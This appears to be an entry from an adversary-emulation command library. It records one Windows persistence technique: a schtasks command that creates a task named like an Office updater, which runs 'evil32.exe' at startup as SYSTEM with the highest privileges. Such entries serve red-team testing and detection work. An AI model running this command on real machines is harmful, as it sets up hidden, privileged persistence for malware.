---
id: 958b18f5-8869-4a8b-92ca-487c33b070d7
name: Schedule Task to run on System Startup
type: command
executor: bash
data: schtasks /create /TN OfficeUpdaterA /tr ""c:\evil32.exe" -k password -n services"
  /SC onstart /RU system /RL HIGHEST
output: null
created_at: '2020-07-14T18:21:10.245100+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Schedule Task to run on System Startup

```bash
schtasks /create /TN OfficeUpdaterA /tr ""c:\evil32.exe" -k password -n services" /SC onstart /RU system /RL HIGHEST
```
